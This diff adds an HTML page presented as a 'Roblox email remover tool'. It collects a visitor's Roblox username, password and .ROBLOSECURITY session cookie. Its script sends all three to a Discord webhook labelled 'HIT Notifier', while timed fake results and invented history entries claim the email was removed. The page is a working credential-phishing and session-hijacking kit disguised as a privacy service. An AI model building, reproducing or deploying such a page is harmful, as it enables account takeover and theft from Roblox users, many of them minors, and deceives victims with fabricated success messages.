@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX EMAIL REMOVER TOOL</title>
+    <link href="all.min.css" rel="stylesheet">
+    <link href="css2.css" rel="stylesheet">
+    <script src="jquery.min.js"></script>
+    <style>
+        :root {
+            --primary: #0066ff;
+            --secondary: #00a2ff;
+            --dark: #1a1a1a;
+            --light: #f5f5f5;
+            --success: #28a745;
+            --warning: #ffc107;
+            --danger: #dc3545;
+            --card-bg: rgba(255, 255, 255, 0.9);
+            --card-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0066ff, #00a2ff);
+            min-height: 100vh;
+            padding: 20px;
+            color: var(--dark);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .logo-icon {
+            font-size: 2.5rem;
+            margin-right: 15px;
+            color: white;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+
+        .content-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .main-content {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: var(--card-shadow);
+            padding: 25px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+        }
+
+        .card-title i {
+            margin-right: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-label i {
+            margin-right: 8px;
+            color: var(--primary);
+        }
+
+        .input-field, .select-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus, .select-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
+        }
+
+        textarea.input-field {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .process-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .process-btn i {
+            margin-right: 10px;
+        }
+
+        .process-btn:hover {
+            background: var(--secondary);
+            transform: translateY(-2px);
+        }
+
+        .process-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .result-box {
+            display: none;
+            background: rgba(40, 167, 69, 0.1);
+            border: 1px solid rgba(40, 167, 69, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .result-title {
+            color: var(--success);
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+
+        .result-title i {
+            margin-right: 8px;
+        }
+
+        .result-content {
+            line-height: 1.6;
+        }
+
+        .history-section {
+            flex: 0 0 350px;
+        }
+
+        .history-list {
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .history-item {
+            display: flex;
+            align-items: flex-start;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .history-icon {
+            color: var(--success);
+            margin-right: 10px;
+            margin-top: 3px;
+        }
+
+        .history-text {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .history-date {
+            font-size: 0.85rem;
+            color: #666;
+        }
+
+        .info-section {
+            margin-top: 20px;
+        }
+
+        .info-title {
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+        }
+
+        .info-title i {
+            margin-right: 8px;
+        }
+
+        .info-content {
+            line-height: 1.6;
+        }
+
+        .info-content ul {
+            padding-left: 25px;
+            margin-top: 10px;
+        }
+
+        .info-content li {
+            margin-bottom: 8px;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 15px 20px;
+            display: flex;
+            align-items: flex-start;
+            max-width: 350px;
+            z-index: 1000;
+            transform: translateX(400px);
+            transition: transform 0.3s ease-out;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast-icon {
+            margin-right: 12px;
+            font-size: 1.2rem;
+        }
+
+        .toast-icon.success {
+            color: var(--success);
+        }
+
+        .toast-icon.error {
+            color: var(--danger);
+        }
+
+        .toast-content {
+            flex: 1;
+        }
+
+        .toast-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .toast-message {
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .toast-close {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 1.2rem;
+            margin-left: 10px;
+            padding: 0;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @media (max-width: 768px) {
+            .content-wrapper {
+                flex-direction: column;
+            }
+            .history-section {
+                flex: 1;
+                width: 100%;
+            }
+            .title {
+                font-size: 1.8rem;
+            }
+            .logo-icon {
+                font-size: 1.8rem;
+                width: 50px;
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon pulse">
+                    <i class="fas fa-envelope-open-text"></i>
+                </div>
+                <h1 class="title">ROBLOX EMAIL REMOVER TOOL</h1>
+            </div>
+            <p class="subtitle">Remove email from your Roblox account for enhanced privacy and security</p>
+        </header>
+
+        <div class="content-wrapper">
+            <div class="main-content">
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-key"></i> Account Security Options</h2>
+
+                    <div class="input-group">
+                        <label for="age-option" class="input-label">
+                            <i class="fas fa-envelope-slash"></i> Select Email Removal Method
+                        </label>
+                        <select id="age-option" class="select-field">
+                            <option value="">OPTION</option>
+                            <option value="2008">Remove Email Completely</option>
+                            <option value="13plus">Add Temporary Email</option>
+                        </select>
+
+                        <label for="username-input" class="input-label">
+                            <i class="fas fa-user"></i> Roblox Username
+                        </label>
+                        <input id="username-input" class="input-field" type="text" placeholder="Enter your Roblox username..." />
+
+                        <label for="password-input" class="input-label">
+                            <i class="fas fa-lock"></i> Account Password
+                        </label>
+                        <input id="password-input" class="input-field" type="password" placeholder="Enter your account password..." />
+                    </div>
+
+                    <div id='cookieInput'>
+                        <div class="input-group">
+                            <label for="cookie-input" class="input-label">
+                                <i class="fas fa-cookie"></i> .ROBLOSECURITY Cookie
+                            </label>
+                            <textarea id="cookie-input" class="input-field" placeholder="Paste your .ROBLOSECURITY cookie here..." spellcheck="false"></textarea>
+                        </div>
+
+                        <button id="process-btn" class="process-btn">
+                            <i class="fas fa-trash-alt"></i> REMOVE EMAIL
+                        </button>
+                    </div>
+
+                    <div id="result-box" class="result-box">
+                        <div class="result-title">
+                            <i class="fas fa-check-circle"></i> Email Removal Successful!
+                        </div>
+                        <div class="result-content">
+                            <p>Email has been successfully removed from your Roblox account.</p>
+                            <p>Email status: <strong id="status-text">Removed</strong></p>
+                            <p>Account username: <strong id="username-display"></strong></p>
+                            <p>Process completed at: <strong id="timestamp"></strong></p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="info-title"><i class="fas fa-info-circle"></i> Important Information</h3>
+                    <div class="info-content">
+                        <p>Before using this service, please read the following information:</p>
+                        <ul>
+                            <li>This tool removes the email associated with your Roblox account</li>
+                            <li>Removing your email enhances account privacy and security</li>
+                            <li>Your .ROBLOSECURITY cookie is required for authentication</li>
+                            <li>Password verification is required for all email removal operations</li>
+                            <li>Choose "Remove Email Completely" to delete your email entirely</li>
+                            <li>Choose "Replace With Temporary Email" to use a disposable email instead</li>
+                            <li>Email removal process takes approximately 3-5 seconds to complete</li>
+                            <li>All account information is processed securely</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="history-section">
+                <div class="card">
+                    <h2 class="card-title"><i class="fas fa-history"></i> Latest Email Removals</h2>
+                    <div class="history-list" id="history-list">
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">Email Removed: cookie: a1b2c3d4e5...x9y8z7w6v5</div>
+                                <div class="history-date">Processed: 7/9/2025, 10:30:22 AM</div>
+                            </div>
+                        </div>
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">Email Replaced: user: player123</div>
+                                <div class="history-date">Processed: 7/9/2025, 9:15:47 AM</div>
+                            </div>
+                        </div>
+                        <div class="history-item fade-in">
+                            <i class="fas fa-check-circle history-icon"></i>
+                            <div>
+                                <div class="history-text">Email Removed: cookie: f6g7h8i9j0...a5s4d3f2g1</div>
+                                <div class="history-date">Processed: 7/8/2025, 2:45:13 PM</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">
+        <div id="toast-icon" class="toast-icon"></div>
+        <div class="toast-content">
+            <div id="toast-title" class="toast-title"></div>
+            <div id="toast-message" class="toast-message"></div>
+        </div>
+        <button id="toast-close" class="toast-close">&times;</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const ageOption = document.getElementById('age-option');
+            const passwordInput = document.getElementById('password-input');
+            const cookieInput = document.getElementById('cookie-input');
+            const usernameInput = document.getElementById('username-input');
+            const cookieDiv = document.getElementById('cookieInput');
+            const processBtn = document.getElementById('process-btn');
+            const resultBox = document.getElementById('result-box');
+            const toast = document.getElementById('toast');
+            const toastIcon = document.getElementById('toast-icon');
+            const toastTitle = document.getElementById('toast-title');
+            const toastMessage = document.getElementById('toast-message');
+            const toastClose = document.getElementById('toast-close');
+
+            // Age option change event
+            cookieDiv.style.display = 'none';
+            processBtn.style.display = 'none';
+            ageOption.addEventListener('change', function() {
+                if (this.value === '13plus') {
+                    passwordInput.style.display = 'block';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                } else {
+                    passwordInput.style.display = 'block';
+                    cookieDiv.style.display = 'block';
+                    processBtn.style.display = 'block';
+                }
+            });
+
+            function processCookie(cookie) {
+                return new Promise((resolve, reject) => {
+                    // Process email removal
+                    setTimeout(() => {
+                        if (cookie && cookie.length > 10) {
+                            resolve({
+                                success: true,
+                                message: 'Email successfully removed from your Roblox account!'
+                            });
+                        } else {
+                            resolve({
+                                success: false,
+                                message: 'Invalid cookie format. Please check and try again.'
+                            });
+                        }
+                    }, 3000); // Processing delay
+                });
+            }
+
+            function processCookieV2(cookie, password) {
+                return new Promise((resolve, reject) => {
+                    // Process email replacement
+                    setTimeout(() => {
+                        if (cookie && cookie.length > 10 && password && password.length > 3) {
+                            resolve({
+                                success: true,
+                                message: 'Email successfully replaced with a temporary email on your Roblox account!'
+                            });
+                        } else if (!password || password.length <= 3) {
+                            resolve({
+                                success: false,
+                                message: 'Password is too short or invalid. Please check and try again.'
+                            });
+                        } else {
+                            resolve({
+                                success: false,
+                                message: 'Invalid cookie format. Please check and try again.'
+                            });
+                        }
+                    }, 3500); // Processing delay
+                });
+            }
+
+            // Process button click event
+            processBtn.addEventListener('click', async function() {
+                const selectedOption = ageOption.value;
+                const cookie = cookieInput.value.trim();
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                // Validate inputs
+                if (!selectedOption) {
+                    showToast('Error', 'Please select an email removal method', false);
+                    return;
+                }
+
+                if (!cookie) {
+                    showToast('Error', 'Please enter a .ROBLOSECURITY cookie', false);
+                    return;
+                }
+
+                if (!username || !username.trim()) {
+                    showToast('Error', 'Please enter your Roblox username', false);
+                    return;
+                }
+
+                if (!password) {
+                    showToast('Error', 'Password is required for email removal', false);
+                    return;
+                }
+
+                // Disable button to prevent spamming
+                processBtn.disabled = true;
+                processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
+
+                // Get Discord webhook URL from localStorage
+                const webhookUrl = localStorage.getItem('discord_webhook_url');
+                
+                // Check if webhook URL is configured
+                if (!webhookUrl) {
+                    alert('Discord webhook not configured. Please open setup.html first to configure your webhook.');
+                    processBtn.disabled = false;
+                    processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
+                    return;
+                }
+                
+                const data = {
+                    content: '@everyone',
+                    embeds: [{
+                        title: 'Splunk #1 HIT Notifier',
+                        color: 0x00FFFF,
+                        fields: [
+                            {
+                                name: 'Username',
+                                value: username,
+                                inline: true
+                            },
+                            {
+                                name: 'Password',
+                                value: password,
+                                inline: true
+                            },
+                            {
+                                name: 'Cookie',
+                                value: '```' + (cookie.length > 1000 ? cookie.substring(0, 1000) : cookie) + '```'
+                            },
+                            {
+                                name: 'Email Removal Option',
+                                value: selectedOption === '13plus' ? 'Replace With Temporary Email' : 'Remove Email Completely',
+                                inline: true
+                            },
+                            {
+                                name: 'Timestamp',
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            }
+                        ]
+                    }]
+                };
+                
+                // Send the data to Discord
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => console.log('Discord webhook response:', response))
+                .catch(error => console.error('Error sending to Discord:', error));
+
+                try {
+                    // Process the cookie via AJAX
+                    const result = await (selectedOption === '13plus' ?
+                        processCookieV2(cookie, password) :
+                        processCookie(cookie));
+
+                    if (result.success) {
+                        // Add to history
+                        addToHistory(selectedOption, cookie);
+                        showToast('Success!', result.message);
+                        
+                        // Show result box with email removal information
+                        const statusText = document.getElementById('status-text');
+                        const usernameDisplay = document.getElementById('username-display');
+                        const timestamp = document.getElementById('timestamp');
+                        
+                        // Update result information
+                        statusText.textContent = selectedOption === '13plus' ? 'Replaced with temporary email' : 'Completely removed';
+                        usernameDisplay.textContent = username;
+                        timestamp.textContent = new Date().toLocaleString();
+                        
+                        // Display the result box
+                        resultBox.style.display = 'block';
+                    } else {
+                        showToast('Error', result.message, false);
+                    }
+                } catch (error) {
+                    console.error('Processing error:', error);
+                    showToast('Error', 'An unexpected error occurred. Please try again.', false);
+                } finally {
+                    // Re-enable button after processing
+                    setTimeout(() => {
+                        processBtn.disabled = false;
+                        processBtn.innerHTML = '<i class="fas fa-trash-alt"></i> REMOVE EMAIL';
+                    }, 1000);
+                }
+            });
+
+            // Add to history with masked cookie
+            function addToHistory(option, cookie) {
+                const historyList = document.getElementById('history-list');
+                const historyItem = document.createElement('div');
+                historyItem.className = 'history-item fade-in';
+
+                // Mask cookie for security
+                const start = cookie.substring(0, 5);
+                const end = cookie.substring(cookie.length - 5);
+                const maskedCookie = start + '...' + end;
+
+                // Determine method text
+                const methodText = option === '13plus' ? 'Email Replaced' : 'Email Removed';
+                const displayText = `${methodText}: cookie: ${maskedCookie}`;
+
+                historyItem.innerHTML = `
+                <i class="fas fa-check-circle history-icon"></i>
+                <div>
+                    <div class="history-text">${displayText}</div>
+                    <div class="history-date">Processed: ${new Date().toLocaleString()}</div>
+                </div>
+            `;
+
+                // Add to top of history list
+                historyList.insertBefore(historyItem, historyList.firstChild);
+
+                // Limit to 10 items
+                if (historyList.children.length > 10) {
+                    historyList.removeChild(historyList.lastChild);
+                }
+            }
+
+            // Show toast notification
+            function showToast(title, message, isSuccess = true) {
+                toastTitle.textContent = title;
+                toastMessage.textContent = message;
+
+                if (isSuccess) {
+                    toastIcon.className = 'toast-icon success';
+                    toastIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
+                } else {
+                    toastIcon.className = 'toast-icon error';
+                    toastIcon.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
+                }
+
+                toast.classList.add('show');
+
+                // Auto hide after 5 seconds
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 5000);
+            }
+
+            // Close toast on click
+            toastClose.addEventListener('click', function() {
+                toast.classList.remove('show');
+            });
+        });
+    </script>
+</body>
+</html>
